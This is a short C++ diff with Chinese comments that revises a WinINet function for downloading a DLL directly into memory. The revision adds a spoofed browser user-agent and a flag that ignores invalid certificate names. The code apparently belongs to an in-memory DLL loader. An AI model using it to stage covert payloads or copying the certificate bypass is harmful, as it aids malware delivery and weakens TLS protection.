@@ -14,23 +14,34 @@
 
 // --- 工具函数：下载 DLL 到内存 ---
 bool DownloadToMemory(const std::string& url, std::vector<BYTE>& outBuffer) {
-    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    // 1. 初始化，增加异步或代理兼容性
+    HINTERNET hInternet = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) return false;
 
-    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    // 2. 开启 URL，添加处理重定向和缓存的标志
+    DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_RESYNCHRONIZE | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID;
+
+    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, flags, 0);
+
     if (!hUrl) {
+        DWORD err = GetLastError();
+        std::cout << "[!] InternetOpenUrlA failed. Error: " << err << std::endl;
         InternetCloseHandle(hInternet);
         return false;
     }
 
+    // 3. 读取数据
     BYTE tempBuffer[4096];
     DWORD bytesRead = 0;
+    outBuffer.clear();
+
     while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead > 0) {
         outBuffer.insert(outBuffer.end(), tempBuffer, tempBuffer + bytesRead);
     }
 
     InternetCloseHandle(hUrl);
     InternetCloseHandle(hInternet);
+
     return !outBuffer.empty();
 }
 
